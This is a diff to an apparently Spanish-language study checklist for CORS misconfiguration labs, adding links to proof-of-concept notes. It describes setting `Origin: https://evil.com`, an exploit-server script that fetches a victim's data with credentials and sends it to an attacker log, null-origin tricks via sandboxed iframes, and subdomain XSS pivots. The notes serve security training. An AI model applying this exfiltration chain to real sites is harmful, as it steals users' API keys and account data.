@@ -28,8 +28,10 @@ tags:
 
 ## ♾️ Independiente del stage
 - [ ] En Repeater, a la request de datos (`/accountDetails`, `/my-account`, `/api/...`) agregá `Origin: https://evil.com` → ¿reflejo? ¿`Allow-Credentials: true`?
-- [ ] **Entrega:** exploit server con `<script>` que hace `fetch(endpoint,{credentials:'include'})` → `location='/log?key='+…` → **Deliver to victim** → leer **Access log**.
-- [ ] Si confía en **subdominios/HTTP** → trampolín = **XSS en un subdominio**.
+- [ ] **Entrega (reflejo):** exploit server con `<script>` que hace `fetch(endpoint,{credentials:'include'})` → `location='/log?key='+…` → **Deliver to victim** → leer **Access log**. → [[vulnerabilities/005-cors/examples/robar-apikey-origin-reflejado|PoC reflejo]]
+- [ ] **`Origin: null`:** generá el origen `null` (iframe *sandboxed*, `data:`, redirect) y exfiltrá igual. → [[vulnerabilities/005-cors/examples/bypass-origin-null|PoC null]]
+- [ ] Si confía en **subdominios/HTTP** → trampolín = **XSS en un subdominio**. → [[vulnerabilities/005-cors/examples/pivot-subdominio-http-via-xss|PoC subdominio]]
 
 ## 🔗 Referencias
 - [[vulnerabilities/005-cors/cors|entry point]] · [[vulnerabilities/005-cors/labs/README|labs]]
+- **PoCs / examples:** [[vulnerabilities/005-cors/examples/robar-apikey-origin-reflejado|reflejo del Origin]] · [[vulnerabilities/005-cors/examples/bypass-origin-null|Origin null]] · [[vulnerabilities/005-cors/examples/pivot-subdominio-http-via-xss|pivot subdominio HTTP vía XSS]]
